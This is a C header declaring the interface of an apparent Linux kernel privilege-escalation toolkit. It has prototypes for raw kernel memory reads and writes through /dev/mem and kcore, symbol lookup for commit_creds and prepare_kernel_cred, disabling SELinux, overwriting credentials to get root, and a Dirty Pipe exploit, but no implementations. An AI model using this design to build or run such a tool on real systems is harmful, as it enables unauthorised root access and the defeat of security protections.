#ifndef KERNEL_DIRECT_H
#define KERNEL_DIRECT_H

#include "util.h"

#ifdef __cplusplus
extern "C" {
#endif

#define KERNEL_MAX_AREAS 64
#define KERNEL_BUF_SIZE 65536

typedef struct {
    unsigned long start;
    unsigned long end;
    int is_writable;
    char name[64];
} KernelMemArea;

typedef struct {
    int fd_mem;
    int fd_kcore;
    int fd_kallsyms;
    KernelMemArea areas[KERNEL_MAX_AREAS];
    int nareas;
    unsigned long saved_cred;
    unsigned long saved_selinux;
    unsigned long addr_selinux_enforcing;
    unsigned long addr_commit_creds;
    unsigned long addr_prepare_kernel_cred;
    unsigned long addr_do_exit;
    char last_error[256];
    int initialized;
} KernelDirect;

void kd_init(KernelDirect *kd);
int kd_open_mem(KernelDirect *kd);
int kd_open_kcore(KernelDirect *kd);
int kd_scan_areas(KernelDirect *kd);
int kd_read_phys(KernelDirect *kd, unsigned long addr, void *buf, size_t sz);
int kd_write_phys(KernelDirect *kd, unsigned long addr, const void *buf, size_t sz);
unsigned long kd_find_symbol(KernelDirect *kd, const char *name);
unsigned long kd_find_selinux_enforcing(KernelDirect *kd);
int kd_disable_selinux(KernelDirect *kd);
int kd_get_root(KernelDirect *kd);
int kd_restore(KernelDirect *kd);
int kd_read_kernel(KernelDirect *kd, unsigned long addr, void *buf, size_t sz);
int kd_write_kernel(KernelDirect *kd, unsigned long addr, const void *buf, size_t sz);
int kd_overwrite_cred(KernelDirect *kd);
int kd_fix_security(KernelDirect *kd);
void kd_close(KernelDirect *kd);
int kd_exploit_dirty_pipe(KernelDirect *kd);

#ifdef __cplusplus
}
#endif
#endif
